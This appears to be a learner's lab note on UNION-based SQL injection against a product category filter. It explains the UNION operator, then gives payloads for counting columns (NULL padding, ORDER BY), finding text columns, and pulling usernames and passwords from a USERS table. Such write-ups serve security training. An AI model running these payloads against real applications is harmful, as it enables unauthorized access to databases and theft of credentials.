# SQL injection - Product category filter

## end goal: determine the number of column return by the query

## background knowledge(UNION in SQL)

```SQL
table1   |    table2
 a | b   |    c | d
--------------------
  1,2    |     3,4
  2,3    |     4,5
--------------------
Query №1: SELECT a, b FROM table1
result №1: 1, 2
           2, 3

Query №2: SELECT a, b FROM table1 UNION SELECT c, d FROM table2;
result №2: 1, 2
           3, 4
           2, 3
           4, 5
```

## Rules using UNION operator

- The number and the order of the columns must be the same in all queries
- The data types must be compatible

### let's say that we have sql vunerability in table1. And we want to extract data from other tables such like USERS

the SQL injection will be look's like:
`SELECT a, b FROM table1 UNION SELECT username, password FROM USERS;`

## SQL injection attack with UNION

### step 1 - find number of columns

#### way #1

`SELECT ? FROM table1 UNION SELECT null;`
if we got an error then we use incorrect number of columns so we add them until we see the 200 response code
`SELECT ? FROM table1 UNION select NULL, NULL[and more and more NULL];`

#### way #2

`SELECT a, b FROM table1 ORDER BY 1[2,3...]`
allow us iteratively ingress number and find the number-of-columns easy

### step 2 - find columns that contains varchar

so we just check every value is it string(varchar) or not
`SELECT a, b FROM table1 UNION SELECT 'a', NULL;`
if we got an error then we try put 'a' in different column
`SELECT a, b FROM table1 UNION SELECT NULL, 'a';`
if it returns ours string 'a' then sql injection successful
